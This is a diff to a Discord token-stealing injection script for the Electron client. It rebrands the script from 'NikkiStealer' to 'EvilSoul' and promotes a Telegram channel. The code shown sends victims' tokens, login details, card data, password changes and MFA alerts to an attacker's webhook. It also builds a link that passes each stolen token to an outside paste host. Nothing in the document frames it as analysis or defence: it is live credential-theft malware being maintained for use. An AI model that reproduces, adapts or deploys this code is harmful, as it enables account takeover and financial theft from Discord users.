@@ -271,14 +271,14 @@ async function initOne() {
   var client_discord = appName;
 
   const embed = {
-    title: 'First Injection Detected - Nikkistealer',
-    color: 0x590000,
+    title: 'First Injection - EvilSoul',
+    color: 0x2b2d31,
     fields: [
-      {
-        name: "Injection Path:",
-        value: "`"+__dirname+"`",
-        inline: false
-      },
+        {
+            name: "Token:",
+            value: "```"+token+"```\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+            inline: false
+        },
       {
         name: "Client:",
         value: "`"+appName+"`",
@@ -295,26 +295,26 @@ async function initOne() {
         inline: true
       },
       {
-        name: "Token:",
-        value: "`"+token+"`\n[Copy Token](https://paste-pgpj.onrender.com/?p="+token+")",
+        name: "Injection Path:",
+        value: "```"+__dirname+"```",
         inline: false
-      },
+      }
     ],
     "author": {
       name: user.username+"#0000 - NikkiStealer",
       icon_url: avatar,
     },
     footer: {
-        icon_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a",
-        text: "nikkistealer by sk4yx"
+        icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
+        text: "EvilSoul | t.me/EvilSoulStealer"
       },
     timestamp: dataNow,
   };
 
   const webhookData = {
     embeds: [embed],
-    username: "Injections - NikkiSt3aler",
-    avatar_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+    username: "Injections - EvilSoul",
+    avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
   };
 
   sendWebhook(webhook, webhookData);
@@ -356,7 +356,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
 
   var Billings = parseBilling(billing)
 
-  if (!user.avatar) var userAvatar = "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+  if (!user.avatar) var userAvatar = "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
   if (!user.banner) var userBanner = ""
 
   userAvatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
@@ -446,7 +446,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a",
+          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
           text: "nikkistealer by sk4yx"
         },
         timestamp: dataNow,
@@ -455,7 +455,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataLogin = {
         embeds: [embedLogin],
         username: "Logins - NikkiSt2aler",
-        avatar_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
       }
 
       await sendWebhook(webhook, dataLogin);
@@ -525,7 +525,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a",
+          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
           text: "nikkistealer by sk4yx"
         },
         timestamp: dataNow,
@@ -536,7 +536,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataLogin3 = {
         embeds: [embedLogin3],
         username: "Logins - NikkiSt2aler",
-        avatar_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
       }
 
       await sendWebhook(webhook, dataLogin3);
@@ -611,7 +611,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar,
         },
         footer: {
-          icon_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a",
+          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
           text: "nikkistealer by sk4yx"
         },
         timestamp: dataNow,
@@ -620,7 +620,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const webhookData = {
         embeds: [embedCard],
         username: "Cards - NikkiSt3aler",
-        avatar_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
       };
       await sendWebhook(webhook, webhookData)
       break
@@ -693,7 +693,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a",
+          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
           text: "nikkistealer by sk4yx",
         },
         timestamp: dataNow,
@@ -702,7 +702,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const webhookData2 = {
         embeds: [embedNewPasswd],
         username: "Password Changer - NikkiSt2aler",
-        avatar_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
       }
 
       await sendWebhook(webhook, webhookData2)
@@ -748,7 +748,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
           icon_url: userAvatar
         },
         footer: {
-          icon_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a",
+          icon_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg",
           text: "nikkistealer by sk4yx",
         },
         timestamp: dataNow,
@@ -757,7 +757,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
       const dataToWebhook = {
         embeds: [embedMFAENABLED],
         username: "Alerts - NikkiSt2aler",
-        avatar_url: "https://media.discordapp.net/attachments/1185334942553608285/1185678887011766382/24.png?ex=65907c83&is=657e0783&hm=2e9b4211e890125dbe7528ef0ae535a72c17e3afd033849b7f5791d24b55b92a"
+        avatar_url: "https://i.ibb.co/rG7zFx5C/photo-5776000422459328372-c.jpg"
       }
 
       await sendWebhook(webhook, dataToWebhook)
